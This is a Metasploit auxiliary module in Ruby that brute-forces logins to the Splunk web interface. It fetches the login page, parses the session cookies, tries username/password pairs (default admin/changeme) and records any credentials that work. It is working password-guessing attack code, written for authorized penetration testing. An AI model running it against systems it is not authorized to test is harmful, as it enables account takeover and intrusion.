##
# splunk_web_login.rb
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'Splunk Web interface Login Utility',
			'Description'    => %{
				This module simply attempts to login to a Splunk
				web iterface using a specific user/pass.
			},
			'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('URI', [true, "URI for Splunk Web login. Default is /en-US/account/login", "/en-US/account/login"]),
				OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
				OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", false])
			], self.class)
	end

	def run_host(ip)
		begin
			res = send_request_cgi({
				'uri'     => datastore['URI'],
				'method'  => 'GET'
				}, 25)
			http_fingerprint({ :response => res })
		rescue ::Rex::ConnectionError => e
			vprint_error("#{msg} #{datastore['URI']} - #{e}")
			return
		end

		if not res
			vprint_error("#{msg} #{datastore['URI']} - No response")
			return
		end
		if !(res.code == 200)
			vprint_error("#{msg} - Expected 200 HTTP code - not Splunk? Got: #{res.code}")
			return
		end
		if res.body !~ /Splunk/
			vprint_error("#{msg} - Expected Splunk page - not Splunk web interface? #{res.body}")
			return
		end

		each_user_pass do |user, pass|
			do_login(user, pass)
		end
	end

	def do_login(user='admin', pass='changeme')
		vprint_status("#{msg} - Trying username:'#{user}' with password:'#{pass}'")
		begin
			res = send_request_cgi({
				'uri'     => datastore['URI'],
				'method'  => 'GET'
				}, 25)

			# stolen from splunk_mappy_exec.rb
			cval = ''
			uid = ''
			session_id_port =
			session_id = ''
			if res and res.code == 200
				res.headers['Set-Cookie'].split(';').each {|c|
					c.split(',').each {|v|
						if v.split('=')[0] =~ /cval/
							cval = v.split('=')[1]
						elsif v.split('=')[0] =~ /uid/
							uid = v.split('=')[1]
						elsif v.split('=')[0] =~ /session_id/
							session_id_port = v.split('=')[0]
							session_id = v.split('=')[1]
						end
					}
				}
			else
				print_error("#{msg} Failed to get login cookies, aborting")
				return :abort
			end

			res = send_request_cgi(
			{
				'uri'     => datastore['URI'],
				'method'  => 'POST',
				'cookie'	=> "uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}",
				'vars_post' =>
					{
						'cval' => cval,
						'username' => user,
						'password' => pass
					}
			}, 25)

			if not res or res.code != 303
				vprint_error("#{msg} FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}")
				return :skip_pass
			else
				print_good("#{msg} SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")

				report_hash = {
					:host   => datastore['RHOST'],
					:port   => datastore['RPORT'],
					:sname  => 'splunk-web',
					:user   => user,
					:pass   => pass,
					:active => true,
					:type => 'password'}

				report_auth_info(report_hash)
				return :next_user
			end
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			print_error("#{msg} HTTP Connection Failed, Aborting")
			return :abort
		end
	end

	def msg
		"#{vhost}:#{rport} Splunk Web -"
	end
end
